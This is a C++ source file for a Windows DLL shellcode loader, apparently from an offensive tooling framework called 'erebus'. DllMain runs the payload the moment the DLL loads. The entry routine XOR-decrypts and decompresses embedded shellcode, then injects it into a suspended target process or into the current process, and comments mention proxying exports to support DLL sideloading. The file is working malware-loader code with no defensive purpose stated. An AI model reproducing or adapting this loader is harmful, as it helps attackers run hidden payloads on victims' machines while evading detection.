#include "loader.hpp"
#include "shellcode.hpp"
#include "config.hpp"

VOID decrypt_xor(BYTE* encrypted, SIZE_T encrypted_len, BYTE* key, SIZE_T key_len)
{
	for (SIZE_T i = 0; i < encrypted_len; i++)
	encrypted[i] ^= key[i % key_len];
	return;
}

/**
 * Deobfuscation routine: Decode -> Decrypt -> Decompress
 * Export forwarding is handled by linker through proxy.def
 */

VOID entry(void)
{
	erebus::config.injection_method = ExecuteShellcode;

	HANDLE process_handle = NULL;
	HANDLE thread_handle = NULL;
	SIZE_T shellcode_size = sizeof(shellcode);

	if (shellcode_size == 0 || (sizeof(shellcode) > 0 && shellcode[0] == 0x00))
	{
		LOG_ERROR("Shellcode is NULL or size is 0 after staging");
		return;
	}

	LOG_SUCCESS("Shellcode staged successfully: %zu bytes", shellcode_size);

#if CONFIG_INJECTION_MODE == 1
	// Remote injection: create suspended process
	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
	erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle);
#elif CONFIG_INJECTION_MODE == 2
	// Self injection: use current process
	process_handle = NtCurrentProcess();
	thread_handle = NtCurrentThread();
#endif

	// ============================================================
	// DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
	// ============================================================

	// STEP 1: DECODE
	LOG_INFO("STEP 1: Analyzing encoding format...");

	// STEP 2: DECRYPT
	LOG_INFO("STEP 2: Checking encryption key...");
	if (sizeof(key) > 0 && key[0] != 0x00)
	{
		LOG_SUCCESS("Encryption key present, applying XOR decryption...");
		erebus::DecryptionXOR(shellcode, shellcode_size, key, sizeof(key));
		LOG_SUCCESS("Decryption complete");
	}
	else
	{
		LOG_INFO("No encryption key provided, skipping decryption");
	}

	// STEP 3: DECOMPRESS
	LOG_INFO("STEP 3: Analyzing compression format...");
	BYTE* pPayload = shellcode;

	// Pass the address of our pointer variable
	erebus::AutoDetectAndDecode(&pPayload, &shellcode_size);

	LOG_SUCCESS("Final shellcode size: %zu bytes", shellcode_size);
	erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);

	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		// Execute payload on DLL load
		entry();
		break;
	}

	case DLL_THREAD_ATTACH:
	{
		// Optional: Execute on thread creation
		break;
	}

	case DLL_THREAD_DETACH:
	{
		// Optional: Cleanup on thread exit
		break;
	}

	case DLL_PROCESS_DETACH:
	{
		// Cleanup on DLL unload
		break;
	}
	}
	return TRUE;
}
